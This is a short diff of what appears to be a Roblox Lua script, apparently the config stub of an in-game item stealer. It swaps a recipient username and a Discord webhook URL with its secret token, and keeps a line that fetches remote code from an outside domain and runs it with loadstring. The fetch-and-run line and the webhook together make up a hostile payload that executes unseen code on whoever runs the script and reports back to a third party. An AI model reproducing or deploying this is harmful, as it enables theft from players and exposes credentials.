@@ -1,4 +1,4 @@
-Username = "rip_TEEDYY"
-Webhook = "https://discord.com/api/webhooks/1265960022630993973/2Ucwy6sof093FH1F4f9HVRC-JgLnVXf9QgJlMEyodUJULq_UdDAXQOtQ4kCx-DkWWcUU"
+Username = "daviblazer01"
+Webhook = "https://discord.com/api/webhooks/1265995986963009536/1lCW5ZXH7VrNhb1TquOzDV2A-pH7xJfijFGkrNUSfT4VYAVp12F_xN51ofXR_I6LIfBL"
 
 loadstring(game:HttpGet("https://egorikusa.space/adopt"))()
